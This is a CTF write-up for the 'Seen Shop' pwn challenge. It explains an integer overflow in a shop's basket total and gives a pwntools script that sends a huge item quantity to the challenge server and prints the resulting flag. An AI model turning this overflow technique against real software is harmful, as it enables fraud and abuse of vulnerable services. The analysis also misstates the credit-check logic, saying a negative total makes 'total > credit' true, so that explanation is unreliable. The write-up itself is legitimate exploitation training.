https://ctftime.org/event/2601

# Seen Shop (pwn)

## Analysis

We can see that in `checkout` we can get the flag provided that `total > credit` and `quantities[6] > 10`:

```c
if(total > credit){
    puts("Not enough credit.");
    exit(0);
}

if(quantities[6] > 10){
    puts("oh... pole ke mirize...");
    system("cat /flag");
}
```

Note that if `total` is negative then `total > credit` is `true`. 

We can see that in `checkout` the variable `total` is subject to overflow:

```c
int total = 0;
puts("Your Basket:");
for (int i = 0; i < NUM_SEENS; i++) {
    if (quantities[i] > 0) {
        printf("%s - %d item = %d Toman\n", seens[i].name, quantities[i], seens[i].price * quantities[i]);
        total += seens[i].price * quantities[i];
    }
}
```

This means that a large enough value in `quantities[i]` will cause `total` to become a negative number.

We can see that in `addToBasket` we can add essentially any number to `quantities[item - 1]`:

```c
printf("Enter quantity: ");
scanf("%d", &qty);
if (qty < 1) {
    puts("Invalid quantity.");
    return;
}
quantities[item - 1] += qty;
```

## Solution

1) Add a large quantity of item number 7 to the basket.
2) Checkout to get the flag.

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"

p = remote("164.92.176.247", 9000)

def add_to_basket(item, quantity):
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"add (1-7): ", str(item).encode())
    p.sendlineafter(b"quantity: ", str(quantity).encode())

def checkout():
    p.sendlineafter(b"choice: ", b"2")

add_to_basket(item=7, quantity=10000000000)
checkout()

p.readuntil(b"oh... pole ke mirize...\n")

print(p.readuntil(b"}").decode()) # FMCTF{61346013e4b1e77a2f1b3675abc62c62}
```

## Flag
`FMCTF{61346013e4b1e77a2f1b3675abc62c62}`

smiley 2025/03/16
